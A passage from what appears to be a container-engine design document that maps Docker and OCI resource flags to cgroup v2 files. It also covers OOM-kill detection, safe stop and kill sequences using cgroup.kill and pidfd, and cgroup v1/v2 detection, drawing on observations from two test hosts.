here silently gives a container either no swap or unlimited swap.

`[O] host-a HIGH` — Host has 2047 MiB of swap, 12 MiB used. Every container
scope reads `memory.swap.max = max` and `memory.swap.current = 0`, plus
`memory.swap.high = max`, `memory.swap.events = high 0 / max 0 / fail 0`, and
`memory.zswap.max = max`. So Docker's default is *unlimited swap for the
container*, i.e. a container can push the host into swap thrash without
exceeding any limit it was given. `[R]` Consider defaulting
`memory.swap.max = 0` when `--memory` is set (the "no swap" posture), which is
what a lot of Kubernetes deployments enforce by hand; make it a flag either way.

`[F] HIGH` — **`--oom-kill-disable` has no cgroup v2 equivalent.** v1 had
`memory.oom_control`'s `oom_kill_disable`; v2 deliberately removed it because a
cgroup that cannot be OOM-killed and cannot reclaim just hangs forever. `[C]`
Docker returns an error for `--oom-kill-disable` on cgroup v2 hosts (with
`--memory`) rather than silently ignoring it. `[R]` Do the same: reject the
flag with a message naming v2, never accept-and-ignore.

`[F] HIGH` — `memory.oom.group` (5.10+): writing `1` makes the cgroup OOM
killer kill **every** task in the cgroup as a unit rather than picking one
victim. `[O] host-a`: reads `0` on all live scopes — Docker does not set it.
`[R] MED` — Setting `memory.oom.group=1` is arguably more correct for a
container: the "kill one process out of a container and leave a half-dead
container running" outcome is worse than a clean container death that the
restart policy can act on. Tradeoff: multi-process containers (supervisord,
a sidecar-in-one-container pattern) lose the ability to survive one greedy
child. `[R]` Default off to match Docker; expose as `--oom-group`.

### 3.2 CPU

| Docker flag | OCI `linux.resources.cpu` | cgroup v2 | note |
|---|---|---|---|
| `--cpus=1.5` | `quota` + `period` | `cpu.max` = `"150000 100000"` | hard cap |
| `--cpu-period` / `--cpu-quota` | `period` / `quota` | `cpu.max` = `"<quota> <period>"` | raw form |
| `--cpu-shares` | `shares` | `cpu.weight` | **relative**, not a cap |
| `--cpuset-cpus` | `cpus` (in `cpuset`) | `cpuset.cpus` | e.g. `0-3`, `0,2` |
| `--cpuset-mems` | `mems` | `cpuset.mems` | NUMA nodes |
| — | `realtimeRuntime`/`realtimePeriod` | *(v2: `cpu.rt_*` absent unless RT_GROUP_SCHED)* | rarely usable |

`[F] HIGH` — `cpu.max` format is `"$MAX $PERIOD"`: "the group may consume up to
$MAX in each $PERIOD duration. `max` for $MAX indicates no limit." Both in
microseconds. Default `"max 100000"`. So `--cpus=1.5` ⇒ `"150000 100000"`;
`--cpus=0.5` ⇒ `"50000 100000"`. Source: cgroup-v2.rst §"CPU Interface Files".

`[O] host-a HIGH` — all five scopes read `cpu.max = max 100000` and
`cpu.weight = 100`, `cpu.max.burst = 0`, `cpu.idle` present. `cpuset.cpus` is
**empty** while `cpuset.cpus.effective` reads `0-3` — this is the important
read-side asymmetry: an empty `cpuset.cpus` means "inherit", and the *effective*
file is the one that tells you what the container can actually use. A monitoring
implementation that reads `cpuset.cpus` to answer "how many CPUs do I have"
gets an empty string, not `0-3`.

`[F] HIGH` — **`cpu.weight` vs `cpu.max` are not two strengths of the same
knob.** `cpu.weight` (range 1–10000, default 100) is proportional and only
binds *under contention*: a container with weight 50 next to one with weight
100 gets one third of the CPU **when both are runnable**, and 100% when it is
alone. `cpu.max` is absolute and binds always: `"50000 100000"` means the
cgroup is throttled to half a CPU even on a completely idle 64-core box.
Users asking "why is my container slow on an idle machine" almost always set
`cpu.max`; users asking "why does my limit not work" almost always set
`cpu.weight`.

`[F] HIGH` — The v1→v2 conversion for `--cpu-shares` is **not identity**. v1
`cpu.shares` has range 2–262144 with default 1024; v2 `cpu.weight` has range
1–10000 with default 100. `[C]` runc/systemd use the mapping
`weight = 1 + ((shares - 2) * 9999) / 262142`, so `shares=1024 → weight≈39`.
`[R]` We should accept `--cpu-shares` for compatibility, convert with that
formula, and **also** expose `--cpu-weight` as the native knob so users on v2
can say what they mean. Silently mapping shares to weight without saying so is
how you get bug reports about "shares don't work like Docker".

`[F] HIGH` — `cpu.max.burst` (5.14+): allows the cgroup to accumulate unused
quota up to the burst value and spend it in a later period. Purely additive to
`cpu.max`; `0` disables. `[R]` Worth exposing eventually because it fixes the
single worst `cpu.max` pathology — a latency-sensitive, mostly-idle service
being throttled by a short burst — but it is not needed for v1 of the engine.

`[F] MED` — `cpuset.cpus` in v2 has a subtlety v1 did not: a child's
`cpuset.cpus` must be a subset of the parent's *effective* set, and writing a
value outside it fails. Also `cpuset.cpus.partition` (5.17+) can create
exclusive root partitions, which is how you get real CPU isolation rather than
just affinity. `MED` — I did not test partition creation. `[R]` Implement
`cpuset.cpus`/`cpuset.mems` as plain passthrough; ignore partitions.

### 3.3 Pids

`[F] HIGH` — `pids.max` takes a number or `max`. When the limit is hit,
`fork(2)`/`clone(2)` fail with **`EAGAIN`**, and `pids.events`'s `max` counter
increments. There is no kill; the process simply cannot spawn. Source:
cgroup-v2.rst §"PID Interface Files".

`[O] host-a HIGH` — `pids.max = 19147` on every scope (see §2.4 — it is
systemd's `DefaultTasksMax`, not Docker's), `pids.current` ranged 2–72 across
the five containers, `pids.events` = `max 0` (never hit).

`[F] HIGH` — The pids controller counts **tasks**, i.e. threads, not processes,
despite the name. A JVM with 200 threads consumes 200 from `pids.max`. `[R]`
Our documentation must say "tasks/threads", and our default (see §2.4) must be
chosen with that in mind — 2048 is fine for a web app, tight for a JVM with a
large thread pool plus a `make -j`.

### 3.4 IO

| Docker flag | OCI `linux.resources.blockIO` | cgroup v2 |
|---|---|---|
| `--blkio-weight` | `weight` | `io.weight` (`default N` or `N`, range 1–10000) |
| `--device-read-bps` etc. | `throttleReadBpsDevice` … | `io.max` per-device lines |
| `--blkio-weight-device` | `weightDevice` | `io.weight` per-device |

`[F] HIGH` — `io.max` takes lines of the form
`MAJ:MIN rbps=… wbps=… riops=… wiops=…`, any subset of the four keys, value
`max` to clear. `io.weight` is `default <n>` plus optional per-device
overrides. Source: cgroup-v2.rst §"IO Interface Files".

`[F] HIGH` — **`io.weight` only does anything with a suitable IO scheduler.**
Proportional IO control in v2 comes from `bfq` (or `io.cost`/`io.latency`);
with `none` or `mq-deadline` — the default on NVMe on most distros —
`io.weight` is inert. `io.max` (throttling) works regardless because it is
implemented in the blk-throttle layer above the scheduler.

`[O] host-a HIGH` — `io.max` is **empty** on all live scopes;
`io.weight` reads `default 100`. `io.stat` reads
`253:0 rbytes=9891840 wbytes=324653056 rios=118 wios=728 dbytes=0 dios=0` —
one device, the root disk. Note the device number is `253:0` (the whole
device) while the container's rootfs bind mounts show `253:1` (the partition).

`[R] MED` — **Implement `io.max` and skip `io.weight` initially.** `io.max` is
predictable and testable; `io.weight` silently does nothing on the majority of
modern hosts and produces "the flag has no effect" reports we cannot fix.
If we do expose `io.weight`, read `/sys/block/<dev>/queue/scheduler` and warn
when it is not `bfq`. Tradeoff: `io.max` requires resolving a path or device
name to `MAJ:MIN`, which means `stat(2)` on the device node plus handling
device-mapper/LVM indirection — real work D3 will also need.

### 3.5 hugetlb, rdma, misc

`[O] host-a HIGH` — the live scopes expose `hugetlb.2MB.max`,
`hugetlb.1GB.max`, `rdma.max`, `misc.max`. All at defaults. `[R]` Skip all
three. `hugetlb` matters only to databases explicitly configured for huge
pages; `rdma` to Infiniband; `misc` currently only accounts SEV/SGX slots.
Each is a two-line addition later if asked for. `[R]` Do plumb `hugetlb`
through the OCI `linux.resources.hugepageLimits` field so a spec round-trips
losslessly even if we do not act on it — silently dropping spec fields is worse
than erroring.
---

## 4. Concrete telemetry — the read side, and detecting an OOM kill correctly

### 4.1 Memory usage: `memory.current` is not RSS

`[F] HIGH` — `memory.current` is "the total amount of memory currently being
used by the cgroup and its descendants", and it **includes page cache**.
`memory.stat` breaks it down. Source: cgroup-v2.rst §"Memory Interface Files".

`[O] host-a HIGH` — `webapp-nginx-1`: `memory.current = 20398080`
(19.5 MiB) while `memory.stat` shows `anon 5672960` (5.4 MiB),
`file 12521472` (11.9 MiB), `kernel 2203648`. So **62% of what a naive
`docker stats` clone would report as "memory used" is reclaimable page cache.**
The `webapp-web-1` container reads `memory.current = 1187749888` (1.13 GiB)
— for a memory-limit dashboard this number is misleading in the other
direction: it would show a container "nearly at its limit" while most of the
charge is evictable.

`[C] HIGH` — Docker's `docker stats` subtracts the cache:
usage = `memory.current - memory.stat:inactive_file` on cgroup v2
(historically `- total_inactive_file` on v1).

`[R] HIGH` — Report **two** numbers and never one: `memory.current` (the
charge, which is what `memory.max` is compared against) and
`memory.current - inactive_file` (the working set, which is what a human wants).
Additionally expose `memory.peak` (5.19+) — `[O] host-a`: present, e.g.
nginx `memory.peak = 47616000` vs `memory.current = 20398080`, so peak is 2.3×
current — because it is a high-water mark you cannot get any other way.
`[R]` Watch out: `memory.peak` became **resettable** (write to it) in 6.8, so
its meaning depends on whether anyone reset it. Do not reset it; other tools
share it.

### 4.2 Detecting an OOM kill — the part everyone gets wrong

`[F] HIGH` — `memory.events` is a flat key/value file with six counters
(cgroup-v2.rst §"Memory Interface Files"), and the definitions are precise:

| key | meaning (verbatim) |
|---|---|
| `low` | "The number of times the cgroup is reclaimed due to high memory pressure even though its usage is under the low boundary." |
| `high` | "The number of times processes of the cgroup are throttled and routed to perform direct memory reclaim because the high memory boundary was exceeded." |
| `max` | "The number of times the cgroup's memory usage was about to go over the max boundary." |
| `oom` | "The number of time the cgroup's memory usage was reached the limit and allocation was about to fail." |
| `oom_kill` | "The number of processes belonging to this cgroup killed by any kind of OOM killer." |
| `oom_group_kill` | "The number of times a group OOM has occurred." |

The four traps, in the order they bite:

1. `[F] HIGH` **`max` is not a kill.** `max` increments every time the limit is
   *approached* and reclaim was attempted. A well-behaved, cache-heavy container
   sitting at its limit will have a `max` counter in the thousands and have
   never been killed. Using `max > 0` as "was OOM-killed" is wrong.
2. `[F] HIGH` **`oom` is not a kill either.** `oom` means the allocation was
   about to fail. Some of those paths return `-ENOMEM` to userspace instead of
   killing (e.g. `GFP_NOWAIT` contexts, or an mmap that gets `ENOMEM`).
   **`oom_kill` is the only counter that means a process died.**
3. `[F] HIGH` **`memory.events` is recursive; `memory.events.local` is not.**
   The `.local` file (5.13+) reports events for this cgroup only. If our
   container cgroup has children (§1.3's recommended layout does), a kill in a
   child shows in the parent's `memory.events` too. For "was *my container*
   OOM-killed", the recursive one is what you want; for "which sub-cgroup",
   the `.local` one. `[O] host-a`: both files present, both all-zero on
   the web container.
4. `[F] HIGH` **Exit code 137 is not proof of OOM.** `137 = 128 + 9`, i.e. the
   process was SIGKILLed — by the OOM killer, by `docker kill`, by our own
   `cgroup.kill`, or by anything with `CAP_KILL`. Docker's own
   `State.OOMKilled` flag comes from watching cgroup events, not from the exit
   code. `[R]` Our `ContainerState` must carry `oom_killed: bool` sourced from
   `oom_kill` having incremented, and never infer it from 137.

`[R] HIGH — the correct algorithm.** Read `memory.events`'s `oom_kill` once
when the container starts (it is 0 for a fresh cgroup, but read it anyway so
the code is also correct for adopt/restore), and re-read it when the container
exits. `oom_kill_after > oom_kill_before` ⇒ OOM-killed. Additionally, for a
*live* signal, `memory.events` supports `poll(2)`/`inotify` — the kernel wakes
pollers on change — so a monitor can react without polling on a timer.

`[R] MED` — Do **not** read the kernel log to detect OOM. It is the obvious
alternative and it is wrong for three reasons: `kernel.dmesg_restrict = 1`
(`[O] host-a`), so an unprivileged daemon cannot read it at all; the format
is unstable across versions; and rate limiting drops lines under load — which
is precisely when OOMs happen.

### 4.3 CPU: throttling is the metric, not usage

`[F] HIGH` — `cpu.stat` reports, among others: `usage_usec`, `user_usec`,
`system_usec`, and — only when `cpu.max` is set — `nr_periods`,
`nr_throttled`, `throttled_usec`, `nr_bursts`, `burst_usec`.

`[O] host-a HIGH` — `webapp-web-1`'s `cpu.stat`:
```
usage_usec 26550896140   user_usec 21313398009   system_usec 5237498130
nice_usec 0   core_sched.force_idle_usec 0
nr_periods 0   nr_throttled 0   throttled_usec 0   nr_bursts 0   burst_usec 0
```
`nr_periods = 0` because `cpu.max = max` — **the throttling counters are only
populated when a bandwidth limit exists.** A dashboard that shows
"throttled: 0%" for an unlimited container is reporting the absence of a limit,
not the absence of throttling.

`[R] HIGH` — `throttled_usec / (nr_periods × period)` is the single most useful
CPU number for a container user, far more than `usage_usec`. A container at
30% CPU that is 40% throttled is misconfigured in a way that raw usage hides
completely (it burns its whole quota in the first 40 ms of each 100 ms period,
then stalls). Expose it as a first-class field.

### 4.4 PSI: `*.pressure`

`[F] HIGH` — PSI (pressure stall information) landed in **Linux 4.20** and
per-cgroup PSI files require `CONFIG_PSI=y`. Each file has two lines, `some`
and `full`, with `avg10`/`avg60`/`avg300` percentages and a `total`
microsecond counter. `some` = at least one task stalled; `full` = **all**
non-idle tasks stalled. Source: `Documentation/accounting/psi.rst`.

`[O] host-a HIGH` — all three of `cpu.pressure`, `memory.pressure`,
`io.pressure` present on every scope. Real values, e.g.
`webapp-redis-1`'s `cpu.pressure`:
`some avg10=0.00 avg60=0.00 avg300=0.00 total=5308213703` (5308 s of cumulative
stall over the container's lifetime) and `io.pressure … total=20052152`. Also
present: `cgroup.pressure` (6.1+), which lets you *disable* PSI accounting for
a subtree to save the overhead.

`[O] old-host HIGH` — `/proc/pressure/cpu`, `/proc/pressure/memory`,
`/proc/pressure/io` all **MISSING** on Rocky 8.8 / 4.18.0-425. PSI is not
compiled in on RHEL 8. So PSI is a 6.x-era feature in practice even though it
landed in 4.20.

`[R] MED` — Expose PSI when present, gate on file existence, never require it.
`memory.pressure`'s `full` line is the best available "this container is
thrashing" signal and it is strictly better than the `memory.high` counter for
that purpose because it is continuous rather than an event count. But it is
optional, so no part of the engine's control logic may depend on it.

### 4.5 The other read files worth wiring

`[O] host-a HIGH` — present and useful on every live scope:

- `cgroup.events` → `populated 1` / `frozen 0`. **`populated` is the correct
  "is anything still alive in this cgroup (or below it)" predicate**, it is
  `poll(2)`-able, and it is race-free in a way that reading `cgroup.procs` is
  not. This is the primitive for "wait for container exit" and for verifying a
  kill completed.
- `cgroup.stat` → `nr_descendants 0` / `nr_dying_descendants 0`.
  `nr_dying_descendants` is how you observe the cgroup-teardown lag that makes
  `rmdir` fail with `EBUSY` right after a kill.
- `pids.events` → `max 0`; `pids.peak` (6.1+) → high-water mark.
- `io.stat` → per-device `rbytes/wbytes/rios/wios/dbytes/dios`.
- `memory.numa_stat`, `memory.reclaim` (5.19+, write bytes to trigger
  proactive reclaim — a genuinely useful knob for an idle-container reaper).

`[R] MED` — `memory.reclaim` is the tidy answer to "shrink an idle container's
footprint without killing it": write a byte count, the kernel reclaims from
that cgroup. Worth a `--reclaim` verb eventually; zero cost to skip now.
---

## 5. Stop and kill semantics

### 5.1 Why "kill the container" ≠ "kill PID 1"

`[F] HIGH` — Killing the container's PID 1 kills PID 1. What happens next
depends on the PID namespace:

- `[F] HIGH` When PID 1 **of a PID namespace** dies, the kernel sends
  `SIGKILL` to every other process in that namespace, and the namespace becomes
  unusable for new processes (`fork` in it returns `ENOMEM`). Source:
  `pid_namespaces(7)`: "If the 'init' process of a PID namespace terminates,
  the kernel terminates all of the processes in the namespace via a SIGKILL
  signal."
- `[F] HIGH` **But this only covers processes in that PID namespace.** A
  process that a container spawned into a *different* PID namespace (it had
  `CAP_SYS_ADMIN` and `unshare`d, or the container was started with
  `--pid=host`) survives. A process that `setns`'d elsewhere survives. And
  crucially, **`docker exec`'d processes are in the container's PID namespace,
  so they die — but a runtime that tracks only its own PID-1 child has no
  record of them and will report "stopped" while they are still being reaped.**
- `[F] HIGH` If the container was created **without** a PID namespace (a legal
  OCI config; `--pid=host`), killing PID 1 kills exactly one process and leaves
  every child running on the host, reparented to host PID 1.

`[R] HIGH` — **The cgroup, not the process tree, is the container's
boundary for lifecycle purposes.** Every kill and every "is it gone?" check
must be expressed over the cgroup. This is not just belt-and-braces: it is the
only formulation that is correct when the PID namespace is shared, when the
container escaped its own PID namespace, or when a child double-forked.

### 5.2 `cgroup.kill` vs walking `cgroup.procs`

`[F] HIGH` — `cgroup.kill` (**Linux 5.14**): "Writing '1' to the file causes
the cgroup and all descendant cgroups to be killed. This means that all
processes located in the affected cgroup tree will be killed via SIGKILL."
It is a single atomic operation from userspace's point of view — no process can
fork out from under it, because the kernel holds the cgroup's lock while
walking. Source: cgroup-v2.rst §"Core Interface Files".

`[F] HIGH` — Walking `cgroup.procs` and `kill(pid, SIGKILL)` each one is
**racy in three distinct ways**:
1. A process can `fork()` between our `read()` of `cgroup.procs` and our
   `kill()`, and the child is not in our list. Loop-until-empty fixes this
   only probabilistically; a tight fork loop can outrun the reader.
2. A pid we read may have exited and been **recycled** by the time we signal
   it — signalling an unrelated process. With `pid_max = 4194304`
   (`[O] host-a`) this is unlikely but not impossible; with the historical
   32768 it was a real bug class. `pidfd_send_signal(2)` (5.1+) is immune, but
   getting a pidfd requires `pidfd_open(2)` (5.3+) on a pid we read — which
   has the same TOCTOU on the *open*, just a smaller window, and `pidfd_open`
   verifies the pid is still the same process only up to that point.
3. `cgroup.procs` "may be duplicated or contain pids that are no longer alive"
   per the kernel doc — so the list itself is not a snapshot.

`[O] host-a HIGH` — `cgroup.kill` **is present** in every
`docker-*.scope` on 6.11. `[O] old-host` — irrelevant, cgroup v1 has no
equivalent (the closest is freeze-then-kill, §5.4).

`[R] HIGH — use `cgroup.kill` when present; fall back to
freeze → walk → kill → thaw, never to a bare walk.**

```
if exists("cgroup.kill"):            # >= 5.14
    write("cgroup.kill", "1")
else:
    write("cgroup.freeze", "1")      # >= 4.19 ; stops forks
    for pid in read("cgroup.procs"): kill(pid, SIGKILL)
    write("cgroup.freeze", "0")      # let the kills land
wait until read("cgroup.events")["populated"] == 0
```
The freeze step is what makes the fallback correct: a frozen task cannot
complete a `fork()`, so the pid list stops changing. `[F] MED` on the exact
freezer/`SIGKILL` interaction — cgroup-v2.rst says "Processes … can still be
killed" while frozen, i.e. `SIGKILL` is delivered and acted on, which is why
thawing afterwards is belt-and-braces rather than required. `MED` because I did
not test the ordering. **Settled by** experiment §1.7-E5.

The final `populated == 0` wait is not optional. Without it, our `rmdir` of the
cgroup races the kernel's teardown and returns `EBUSY`
(`nr_dying_descendants > 0`), and callers see spurious "failed to remove
container" errors.

### 5.3 `cgroup.freeze`

`[F] HIGH` — Writing `1` to `cgroup.freeze` freezes the cgroup and all
descendants; `cgroup.events`'s `frozen` field reports the state (the freeze is
asynchronous, so the write returns before the tasks are actually stopped —
poll `cgroup.events`). Processes can still be killed, and can still be moved
into and out of a frozen cgroup. Landed **Linux 5.2** for cgroup v2
(v1's `freezer` controller is separate and older). Source: cgroup-v2.rst
§"Core Interface Files".

`[O] host-a HIGH` — `cgroup.freeze` present, reads `0`, on all scopes.

`[R] HIGH` — This is `docker pause`/`unpause`, and it is nearly free to
implement: two writes and one poll. Implement it. It is also the correct
primitive for a safe checkpoint or a "stop the world before inspecting the
mount table" operation.

`[R] MED` — One trap worth designing around: **a frozen container cannot
respond to `SIGTERM`.** If our `stop` path sends SIGTERM and the container is
paused, the grace period expires and we SIGKILL a container that would have
exited cleanly. Docker has had this bug. `[R]` `stop` must thaw first, or
refuse with a clear error naming `unpause`.

### 5.4 What Docker's `stop` actually does, and what ours should

`[C] HIGH` — `docker stop`:
1. Sends the container's stop signal — `SIGTERM` by default, overridable per
   image via `STOPSIGNAL` / per container via `--stop-signal` — **to PID 1
   only**.
2. Waits `--time` / `--stop-timeout` seconds (default **10**).
3. If PID 1 is still alive, `SIGKILL`.
`docker kill` skips straight to step 1 with `SIGKILL` (or `-s`).

`[F] HIGH` — Step 1's "PID 1 only" has a consequence that bites constantly:
**a shell-form `CMD` makes `/bin/sh -c "…"` PID 1, and `sh` does not forward
`SIGTERM` to its child.** So the app never sees the signal, the 10 seconds
always elapse, and every stop is a `SIGKILL`. This is not a Docker bug; it is
what "signals go to PID 1" means. (Exec-form `CMD ["nginx","-g","daemon off;"]`
avoids it.)

`[F] HIGH` — Second consequence: **PID 1 in a PID namespace does not get
default signal actions.** The kernel suppresses the default handler for
signals sent to a namespace's init from *within* that namespace; a signal from
outside the namespace is delivered only if init has installed a handler for it
(`pid_namespaces(7)`). So `SIGTERM` to a PID 1 that has no `SIGTERM` handler is
**silently discarded** — which is the second half of why `sh -c` containers
never stop gracefully. `SIGKILL` and `SIGSTOP` from outside are the exceptions
and always work.

`[R] HIGH — our `stop` sequence:**
```
1. thaw if frozen                            (else SIGTERM is a no-op)
2. record memory.events:oom_kill             (baseline for §4.2)
3. send stop-signal to PID 1                 (pidfd, not pid — see §5.5)
4. wait on cgroup.events:populated via poll(), with timeout
5. on timeout: cgroup.kill (or freeze/walk/kill fallback)
6. wait populated == 0
7. reap, read final stats, rmdir cgroup (retry on EBUSY)
```
`[R]` Step 4 waiting on `cgroup.events:populated` rather than on PID 1's exit
is the design decision worth defending: it means the timeout expires only when
*something* in the container is still alive, not just when PID 1 is. A
container whose PID 1 exits but which leaked a background process into the
same cgroup will be correctly detected and killed instead of leaving a zombie
cgroup. Tradeoff: it differs from Docker, which returns as soon as PID 1 is
reaped — so a container with an intentionally-detached child will take the full
grace period under our semantics where Docker returns immediately. `[R]`
Resolve by returning as soon as PID 1 exits *and* scheduling the cgroup cleanup
asynchronously, reporting the container as stopped either way.

### 5.5 `pidfd` — signal without the recycling race

`[F] HIGH` — `pidfd_open(2)` (**5.3**) returns a file descriptor that refers to
a *process*, not a pid number; `pidfd_send_signal(2)` (**5.1**) signals through
it and returns `ESRCH` if the process is gone rather than signalling a
recycled pid. `clone3(2)`/`clone(2)` with `CLONE_PIDFD` returns a pidfd for the
child directly, which is race-free by construction. A pidfd is also
`poll(2)`-able: it becomes readable when the process exits.

`[O] old-host HIGH` — probing raw syscall numbers on Rocky 8.8 / 4.18.0-425:
`syscall(424 /*pidfd_send_signal*/, -1, 0, 0, 0)` → **`EBADF`** (so the syscall
**is implemented** — RHEL backported it), while
`syscall(434 /*pidfd_open*/, -1, 0)` → **`ENOSYS`** (not implemented). An
`ENOSYS` return is the kernel's signal for "no such syscall"; any other errno
proves the syscall exists. So on RHEL 8 you can signal a pidfd but cannot
obtain one via `pidfd_open` — you would have to `open("/proc/<pid>", O_DIRECTORY)`
or use `CLONE_PIDFD`, and `clone3` is `ENOSYS` there too.

`[R] HIGH` — **Get PID 1's pidfd from `clone(CLONE_PIDFD)` at creation time and
never store a bare pid for signalling.** This costs one extra field in the
container state, removes an entire race class, and gives us a pollable exit
notification for free — which is exactly what step 4 of §5.4 wants and what
otherwise requires `SIGCHLD` plumbing or a `waitpid` thread. This is the
cheapest correctness win in the whole document.
---

## 6. cgroup v1 vs v2, detection, and the no-writable-cgroup case

### 6.1 The differences that actually change code

| concern | v1 | v2 |
|---|---|---|
| hierarchy | one tree **per controller**, mounted separately; a process has an independent position in each | one unified tree; one position |
| memory limit | `memory.limit_in_bytes` | `memory.max` |
| memory+swap | `memory.memsw.limit_in_bytes` = **mem + swap** | `memory.swap.max` = **swap only** |
| soft limit | `memory.soft_limit_in_bytes` (best-effort, widely considered broken) | `memory.low` / `memory.min` (well-defined) |
| throttle-without-kill | **none** | `memory.high` |
| OOM notification | `memory.oom_control` + `cgroup.event_control` eventfd | `memory.events` (`poll`-able) |
| disable OOM kill | `memory.oom_control:oom_kill_disable` | **removed on purpose** |
| kernel memory | `memory.kmem.limit_in_bytes` (deprecated, buggy) | always accounted, no separate knob |
| CPU cap | `cpu.cfs_quota_us` + `cpu.cfs_period_us` (two files) | `cpu.max` (one file, `"quota period"`) |
| CPU shares | `cpu.shares`, 2–262144, default 1024 | `cpu.weight`, 1–10000, default 100 |
| CPU stats | `cpuacct.usage*` + `cpu.stat` | `cpu.stat` only |
| pids | `pids.max` | `pids.max` (same) |
| devices | `devices.allow`/`devices.deny` (a real controller) | **no controller** — eBPF `BPF_PROG_TYPE_CGROUP_DEVICE` (§15) |
| freeze | `freezer` controller, `freezer.state` | `cgroup.freeze` (core, not a controller) |
| mass kill | none | `cgroup.kill` |
| PSI | none | `*.pressure` |
| internal processes | allowed everywhere | forbidden except root (§1.3) |
| rootless delegation | effectively impossible | `Delegate=`, `nsdelegate` |
| namespace | `cgroup` ns exists (4.6+) but is nearly useless (v1 paths leak) | cgroupns is the delegation boundary |

`[F] HIGH` — **v1's rootless story is not "harder", it is structurally
broken.** Two reasons, both fatal:
1. Delegating a v1 subtree means `chown`ing directories in *each* controller
   hierarchy separately, and the per-controller trees are not aligned — `[O]
   old-host` shows our shell at `session-N.scope` for `pids`/`memory`, at
   `/user.slice` for `devices`, at `/` for `cpu`, and at
   `/system.slice/sshd.service` for `blkio`. There is no single subtree to
   delegate.
2. There is no `nsdelegate` equivalent, so containment relies entirely on
   filesystem permissions, and v1 has the `release_agent` hole
   (CVE-2022-0492, §12.2) that makes a *writable* v1 hierarchy inside a
   container a root escape. Giving an unprivileged user a writable v1
   hierarchy is handing them the host.

### 6.2 How to detect v1 / v2 / hybrid correctly

`[F] HIGH` — The authoritative test is the **filesystem magic on the cgroup
mount point**, via `statfs(2)`:

| magic | constant | meaning |
|---|---|---|
| `0x63677270` | `CGROUP2_SUPER_MAGIC` | `/sys/fs/cgroup` is cgroup v2 → **unified** |
| `0x01021994` | `TMPFS_MAGIC` | `/sys/fs/cgroup` is tmpfs with v1 controllers mounted under it → **legacy or hybrid** |

Then, if tmpfs: if `/sys/fs/cgroup/unified` is `CGROUP2_SUPER_MAGIC`, it is
**hybrid** (systemd's `SYSTEMD_CGROUP_ENABLE_LEGACY_FORCE` / `unified_cgroup_hierarchy=0`
world); otherwise **legacy v1 only**.
Source: `statfs(2)`; this is exactly runc's `libcontainer/cgroups.IsCgroup2UnifiedMode()`
and systemd's `cg_unified_cached()`.

`[O] host-a HIGH` — `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`. Unified.
`[O] old-host HIGH` — `stat -fc %T /sys/fs/cgroup` → `tmpfs`, and
`/sys/fs/cgroup/unified` **does not exist**; 12 per-controller `cgroup` mounts
exist under it. Legacy v1 only.

`[R] HIGH — do NOT detect by parsing `/proc/self/cgroup`, and this is not
hypothetical.** `[O] old-host HIGH` — `/proc/self/cgroup` on this legacy-only
host ends with the line:
```
0::/
```
That `0::` line is the cgroup-v2 line. It is present because the kernel has a
v2 root regardless of whether anyone mounted it. A runtime that concludes "v2
is available because `/proc/self/cgroup` has a `0::` entry" will be wrong on
this host and will then try to write to a `/sys/fs/cgroup` that is a read-only
tmpfs. **This is a real trap and the reason `statfs` is the right test.**

`[R] HIGH` — Also do not detect by checking `/proc/filesystems` for `cgroup2`
(the kernel supports it, nobody mounted it) or by kernel version (see §7.2 on
RHEL backports).

### 6.3 Is supporting cgroup v1 worth it?

`[R] HIGH — no. Detect v1, refuse resource limits with a precise message, and
run the container anyway.**

The evidence, weighed:

**Against supporting v1:**
- It roughly doubles the resource subsystem: a second file-name mapping, a
  second stats parser, a second mount discovery path (parse
  `/proc/self/mountinfo` for each controller), a second delegation story, and
  the `memsw` arithmetic. runc's `libcontainer/cgroups/fs` (v1) is
  substantially larger than `fs2` (v2), and most of runc's cgroup bug history
  is in v1.
- `[O] old-host HIGH` — **the one v1 host we have cannot be limited anyway.**
  Every controller root is mode `555` root-owned; `mkdir /sys/fs/cgroup/memory/test-d5`
  → `EACCES`; the session dirs the kernel names for `pids`/`memory` are not
  present; and `mount -t cgroup2` inside a user namespace → `EPERM`. So a
  full v1 implementation would buy **zero** additional capability on the only
  machine that would use it. This is the decisive argument.
- Every distro that matters has moved: Fedora 31+ (2019), Ubuntu 21.10+,
  Debian 11+, RHEL/Rocky/Alma **9**+, Arch, SUSE 15.3+ all boot unified by
  default. v1 is RHEL 8 and old embedded images.
- v1 has an active escape class (§12.2) that v2 does not.

**For supporting v1:** RHEL 8 is supported until 2029 and is common in
enterprises and HPC. That is a real audience — but it is an audience for a
*production* engine, not for this one.

`[R] HIGH — the honest degradation, spelled out.** Three tiers, and the
distinction between them must be visible in the CLI:

| situation | behaviour |
|---|---|
| v2 unified, writable subtree | full limits |
| v2 unified, **no** writable subtree (rootless without delegation) | run the container; **refuse** any explicitly-requested limit with an error naming the missing delegation; apply no silent partial limits |
| v1 (any) | run the container; refuse any explicitly-requested limit with an error naming cgroup v1; report `cgroups: v1 (unsupported, no limits)` in `info` |
| no writable cgroup at all (`old-host`) | same as above; `info` says `cgroups: none (no limits enforceable)` |

`[R] HIGH` — **The rule that matters: a requested limit that cannot be applied
is a hard error, and an unrequested limit that cannot be applied is a logged
note.** Never silently succeed. The failure mode we are avoiding is the one
that has bitten every "rootless container" user: `--memory=512m` accepted,
never enforced, and the process OOMs the host three weeks later. Podman
historically warned-and-continued here; that is the wrong default for a tool
someone might trust.

`[R] MED` — Corollary: `--memory` etc. must be *distinguishable* from
"defaulted" in our config type. `Option<u64>` where `None` means "user said
nothing", not `0`-means-unlimited. Docker's API uses `0` for both, which is why
Docker cannot tell the difference and cannot produce this error. **This is a
type-level decision that is expensive to retrofit** — see §18.
---

## 7. Kernel feature floor — what each version buys

### 7.1 The table

Versions are **upstream** merge windows. `[F]` for anything with a man-page or
`cgroup-v2.rst` statement; `[F] MED` where I have the version from a commit
reference found via search rather than from the source tree itself.

| feature | upstream | what we lose without it | our stance |
|---|---|---|---|
| cgroup v2 (`cgroup2fs`) usable | 4.5 | everything in §1–6 | **required** |
| cgroup namespace | 4.6 | container sees host cgroup paths; §11 leak | **required** |
| `nsdelegate` mount option | 4.13 | cgroupns is not a delegation boundary | strongly wanted |
| `cgroup.type` / threaded | 4.14 | nothing (we skip it, §1.4) | don't care |
| eBPF device cgroup (`BPF_PROG_TYPE_CGROUP_DEVICE`) | 4.15 | no device access control on v2 (§15) | needed for parity |
| PSI (`*.pressure`) | 4.20 | no stall telemetry (§4.4) | optional |
| `memory.oom.group` | 4.19 `[F] MED` | no all-or-nothing container OOM (§3.1) | optional |
